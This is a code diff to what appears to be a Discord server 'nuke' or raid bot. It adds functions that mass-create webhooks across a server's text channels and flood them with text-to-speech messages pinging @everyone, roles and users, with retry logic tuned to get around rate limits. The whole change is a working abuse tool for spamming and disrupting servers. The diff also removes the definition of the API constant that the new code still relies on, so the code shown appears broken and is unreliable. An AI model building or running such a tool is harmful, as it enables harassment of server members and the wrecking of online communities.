@@ -12,7 +12,54 @@ from aiolimiter import AsyncLimiter
 
 from .settings import Settings, State, MISSING, now as utils_now
 
-API = "https://discord.com/api/v10"
+create_sem = asyncio.Semaphore(1000)
+spam_sem = asyncio.Semaphore(1000)
+
+
+def _clean_name(name: str) -> str:
+    return name if "discord" not in name.lower() else "nuke"
+
+
+async def _create_webhook(session: aiohttp.ClientSession, limiter: AsyncLimiter, channel_id: int, name: str) -> tuple[str, str] | None:
+    payload = {"name": _clean_name(name)}
+    for attempt in range(3):
+        try:
+            async with create_sem:
+                async with limiter:
+                    async with session.post(f"{API}/channels/{channel_id}/webhooks", json=payload) as res:
+                        if res.status in (200, 201):
+                            data = await res.json()
+                            return (data["id"], data["token"])
+                        if res.status == 429:
+                            data = await res.json()
+                            retry_after = float(data.get("retry_after", 1.0))
+                            logging.warning(f"wh create 429 retry={retry_after:.1f}s")
+                            await asyncio.sleep(retry_after + 0.1)
+                            continue
+                        if res.status >= 500 and attempt < 2:
+                            await asyncio.sleep(0.5 * (attempt + 1))
+                            continue
+                        body = await res.text()
+                        logging.warning(f"wh create failed {res.status}: {body[:200]}")
+        except Exception as e:
+            logging.warning(f"wh create ch {channel_id}: {e}")
+        break
+    return None
+
+
+async def _spam_webhook(session: aiohttp.ClientSession, limiter: AsyncLimiter, wid: str, wtoken: str, message: str, name: str) -> None:
+    payload = {
+        "content": message,
+        "allowed_mentions": {"parse": ["roles", "users", "everyone"]},
+        "tts": True,
+        "name": _clean_name(name),
+    }
+    try:
+        async with spam_sem:
+            async with limiter:
+                await session.post(f"{API}/webhooks/{wid}/{wtoken}", json=payload)
+    except Exception as e:
+        logging.warning(f"wh spam {wid}: {e}")
 
 
 async def _request(session: aiohttp.ClientSession, method: str, url: str, payload: dict | None, limiter: AsyncLimiter) -> bool:
@@ -193,40 +240,43 @@ class Operations:
         if not text_channels:
             return 0
 
-        # create webhooks in small batches to avoid rate limits
-        webhook_payload = {"name": self.settings.webhook_name}
+        # create webhooks in batches of 25
+        names_pool = self.settings.channel_names or ["ZNE Fluk"]
         valid = []
-        for c in text_channels:
-            ok = await _request(self.session, "POST", f"{API}/channels/{c.id}/webhooks", webhook_payload, self.limiter)
-            if ok:
-                try:
-                    async with self.session.get(f"{API}/channels/{c.id}/webhooks") as res:
-                        if res.status == 200:
-                            whs = await res.json()
-                            for wh in whs:
-                                if wh.get("token"):
-                                    valid.append((wh["id"], wh["token"]))
-                                    break
-                except Exception:
-                    pass
-            if len(valid) >= 10:
-                break
-            await asyncio.sleep(1.0)
+        for i in range(0, len(text_channels), 25):
+            batch = text_channels[i:i + 25]
+            tasks = []
+            for c in batch:
+                name = random.choice(names_pool)
+                tasks.append(asyncio.create_task(_create_webhook(self.session, self.limiter, c.id, name)))
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for w in results:
+                if not isinstance(w, Exception) and w:
+                    valid.append(w)
+            await asyncio.sleep(0.5)
 
         if not valid:
-            logging.info(f"[spam_webhook] no webhooks")
+            logging.info(f"[spam_webhook] no webhooks created")
             return 0
 
+        logging.info(f"[spam_webhook] created {len(valid)} webhooks")
+
         # spam webhooks
-        payload = {
-            "content": self.settings.webhook_message,
-            "username": self.settings.webhook_name,
-            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
-        }
         items = []
         for _ in range(self.settings.webhook_count):
             for wid, wtoken in valid:
-                items.append((f"{API}/webhooks/{wid}/{wtoken}", payload))
-        ok = await _run_batched(items, "POST", self.session, self.limiter)
-        logging.info(f"[spam_webhook] {ok}")
+                items.append((wid, wtoken))
+
+        ok = 0
+        for i in range(0, len(items), 25):
+            batch = items[i:i + 25]
+            tasks = []
+            for wid, wtoken in batch:
+                name = random.choice(names_pool)
+                tasks.append(asyncio.create_task(_spam_webhook(self.session, self.limiter, wid, wtoken, self.settings.webhook_message, name)))
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            ok += sum(1 for r in results if not isinstance(r, Exception))
+            await asyncio.sleep(0.25)
+
+        logging.info(f"[spam_webhook] sent={ok}")
         return ok
